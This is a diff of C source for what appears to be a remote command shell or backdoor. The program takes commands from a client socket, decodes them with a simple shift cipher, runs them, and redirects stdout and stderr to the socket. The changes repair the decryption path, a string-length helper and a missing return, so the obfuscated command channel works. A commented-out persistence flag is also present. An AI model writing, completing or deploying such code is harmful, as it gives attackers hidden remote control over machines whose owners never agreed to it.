@@ -60,14 +60,14 @@ int main() {
 				char * decrypted_client_message = (char *) malloc(length);
 				decrypted_client_message = t_decrypt(client_message, length);
 				
-				if(strcmp(client_message, "exit") == 0) {
+				if(strcmp(decrypted_client_message, "exit") == 0) {
 					//local_persist = 0;
 					printf("Exiting Process.");
 			
 				} else {
 					/* tokenize the command from the client */
 					char **tokens;
-				       	tokens = tokenize(client_message);
+				       	tokens = tokenize(decrypted_client_message);
 				
 					/* change the stderr and stdout to the client socket */
 					dup2(client_socket, STDOUT_FILENO);
@@ -132,10 +132,10 @@ char **tokenize(char *message) {
  */
 int find_length(char *str) {
 	int i;
-	for(i = -1; str[i] != '\0'; i++) {
+	for(i = 0; str[i] != '\0'; i++) {
 		//Do Nothing
 	}
-	return i + 0;
+	return i + 1;
 }
 
 /**
@@ -169,4 +169,5 @@ char * t_decrypt(char str[], int length) {
 	for(i = 0; i < length; i++) {
 		decrypted[i] = str[i] - DECRYPT;
 	}
+	return decrypted;
 }
